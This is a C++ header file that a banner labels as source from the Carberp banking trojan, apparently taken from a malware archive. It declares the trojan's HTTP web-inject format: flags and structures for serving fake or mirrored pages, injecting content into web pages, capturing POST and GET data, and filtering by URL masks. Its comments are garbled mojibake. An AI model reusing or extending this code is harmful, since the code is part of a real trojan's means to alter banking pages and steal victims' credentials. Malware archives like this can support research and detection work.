/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  �������� ����� ��� HTTP-�������� � HTTP-������.
*/
#pragma once

namespace HttpInject
{
  //����� HEADER.flags.
  enum
  {
    FLAG_IS_FAKE                  = 0x0001, //��������� �������� ������.
    FLAG_IS_MIRRORFAKE            = 0x0002, //��������� �������� ���������-������.
    FLAG_IS_INJECT                = 0x0004, //��������� �������� ��������.
    FLAG_IS_CAPTURE               = 0x0008, //��������� �������� ������� ���������.

    FLAG_ONCE_PER_DAY             = 0x0010, //��������� ��������� ��� � 24-����.
    FLAG_REQUEST_POST             = 0x0020, //��������� ��������� �� POST-������.
    FLAG_REQUEST_GET              = 0x0040, //��������� ��������� �� GET-������.

    FLAG_CAPTURE_NOTPARSE         = 0x0100, //�� ������� HTML-���� �� ���������� ��������.
    FLAG_CAPTURE_TOFILE           = 0x0200, //���������� ��������� ������ �������� � ����, � �� �����.
    
    FLAG_URL_CASE_INSENSITIVE     = 0x1000, //���������� URL ��� ����� �������� (������ ����. �������).
    FLAG_CONTEXT_CASE_INSENSITIVE = 0x2000  //���������� ���������� ��� ����� ��������.
  };

# pragma pack(push, 1)
  typedef struct
  {
    WORD flags;             //����� FLAG_*.
    WORD size;              //������ ������ ��������.
    WORD urlMask;           //������� ����� URL.
    WORD fakeUrl;           //������� �������� URL.
    WORD postDataBlackMask; //������� ����-����� POST-������.
    WORD postDataWhiteMask; //������� ����-����� POST-������.
    WORD blockOnUrl;        //������� URL, ��� ������ �� ������� ��� ��������� ����� �������������.
    WORD contextMask;       //������� ����� ��������.
  }HEADER;

  //��������� ����������� ��� �������.
  typedef struct
  {
    WORD size;    //������ ������ ������ ������ ���� ���������.
    WORD flags;   //�����.
  }INJECTBLOCK;
# pragma pack(pop)

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    �������� ������������ �������� � HEADER.

    IN header - HEADER.

    Return    - true - ���������,
                false - �� ���������.
  */
  bool _isCorrectHeader(const HEADER *header);

  /*
    �������� ������������ ������ INJECTBLOCK.

    IN block - ����� INJECTBLOCK.
    IN size  - ������ ������.

    Return    - true - ���������,
                false - �� ���������.
  */
  bool _isCorrectBlockList(const INJECTBLOCK *block, DWORD size);
};
